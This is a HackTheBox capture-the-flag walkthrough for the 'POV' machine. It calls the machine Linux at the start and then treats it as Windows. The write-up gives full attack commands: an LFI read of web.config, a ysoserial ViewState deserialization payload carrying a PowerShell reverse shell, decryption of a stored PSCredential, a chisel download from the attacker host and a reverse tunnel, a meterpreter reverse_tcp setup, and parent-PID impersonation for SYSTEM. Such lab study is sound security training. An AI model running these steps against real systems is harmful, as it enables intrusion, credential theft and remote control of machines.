HackTheBox - POV

POV is a medium difficulty Linux machine, that requires us to find a second VHost, which we can exploit with LFI and a deserialization attack to gain a foothold. To escalate our privileges we have to exploit stored PSCredentials, which allows us to gain access to a second user account. The second user account has SeDebugPrivileges, which we can abuse to gain System privileges.

After adding dev.pov.htb to my hosts file I started to investigate the website.
The first thing that stood out to me was the “Download CV” button. It might be possible to abuse it for local file inclusion (LFI), or a deserialization attack.

So, I started with intercepting the download request and test for LFI vulnerabilities, by replacing file=cv.pdf with file=..\web.config:

It is a Windows machine, so make sure to use a backslash and not a slash, or else it will not work.

It worked! I played around with it for a while, but it didn’t lead to something useful.
After some research I found this blog post. It explains how you can use a software called ysoserial to exploit the viewstate to gain RCE.

Gaining a foothold

Now, let’s run ysoserial:

You can get the machineKey decryption, validationKey and the decryption key from the web.config we received with our LFI attack earlier. I used the PowerShell base64 reverse shell from https://www.revshells.com/.

1

wine ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "<powershell base64 rev shell>" --path="/portfolio" --apppath="/" --validationalg="SHA1" --validationkey=<validationKey> --decryptionalg="<web.config machineKey decryption>" --decryptionkey=<decryptionkey>

Copy the generated hash into a file and remove all line breaks:

1
2

nano temp_state
cat temp_state | tr -d '\n' > viewstate.txt && rm temp_state

Then open a new tab or window of your terminal and start a netcat listener:

1

nc -lvnp 8844

Copy the hash from viewstate.txt into the __VIERSTATE parameter inside the request we intercepted earlier:

Privilege Escalation

Lateral movement to alaading

The first thing I did was running whoami /priv and whoami /groups, which didn’t reveal anything useful.
So I checked the common working directories of our current user:

It revealed connection.xml, which contains credentials after closer inspection:

<Props>
    <S N="UserName">alaading</S>
    <SS N="Password">01000000d08c9...</SS>
...

It appears to be a PSCredential secure string.
After some research I found a method to extract the clear text credentials.

Do not use the method as is in a real pentest. Writing credentials to a file can have severe consequences.

1
2
3
4
5
6
7
8
9

$user = "alaading"

$pass = "01000000d08c9..." | ConvertTo-SecureString

$cred = New-Object System.Management.Automation.PSCredential($user, $pass)

mkdir C:\programdata\share

$cred.GetNetworkCredential() | fl > C:\programdata\share\creds.txt

Then we can display them like this:

1
2
3
4
5

type C:\programdata\share\creds.txt

UserName       : alaading
Password       : f8...
...

Now we can setup a Chisel tunnel to use the credentials via WinRM.
You can get Chisel here.

First we need to transfer it over to the target machine:

1
2
3

cd C:\programdata\share

curl -o chisel.exe 10.10.10.10\chisel.exe

Then we need to setup Proxychains and start the Chisel server on our machine:

Make sure to comment out the socks4 line at the end of your file, if it exists.

1
2
3
4
5
6
7

sudo nano /etc/proxychains4.conf
# add the following line to the bottom of the file
socks5 127.0.0.1 1080

# then we can start the server
chmod +x chisel
./chisel server --reverse -v -p 8000 --socks5

Now we can start Chisel on our target machine to connect to us:

1

.\chisel.exe client 10.10.10.10:8000 R:socks

This allows us to run evil-winrm over proxychains in a new tab to connect as alaading!

1

proxychains evil-winrm -i 10.129.29.172 -u alaading -p 'f8g...'

At first I tried to use ProcDump to dump the stored credentials of LSASS, but it didn’t have the Administrator credentials in it.
There is also a second method. We can use a script to hijack an elevated process to execute commands.

I ran tasklist to display all processes, but alaading is not allowed to do so. So I created a msfvenom reverse shell and ran the ps command in our meterpreter shell.

msfconsole

set LHOST 10.10.10.10
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp

run

2

*Evil-WinRM* PS C:\programdata\share> upload backup.exe
*Evil-WinRM* PS C:\programdata\share> .\backup.exe

2

4

meterpreter > ps
...
548   472   winlogon.exe       x64   1                      C:\Windows\System32\winlogon.exe
...

Now start a second listener.

1

nc -lvnp 8845

Then we need to download the script, transfer it to our target machine and execute the attack:

Make sure to use the PID and not the PPID, even though the flag says PPID! I used the same base64 shell again, and just adjusted the port to 8845.

1
2
3

*Evil-WinRM* PS C:\programdata\share> upload psgetsys.ps1

*Evil-WinRM* PS C:\programdata\share> ImpersonateFromParentPid -ppid 548 -command "c:\windows\system32\cmd.exe" -cmdargs "/c <base64 rev shell>"
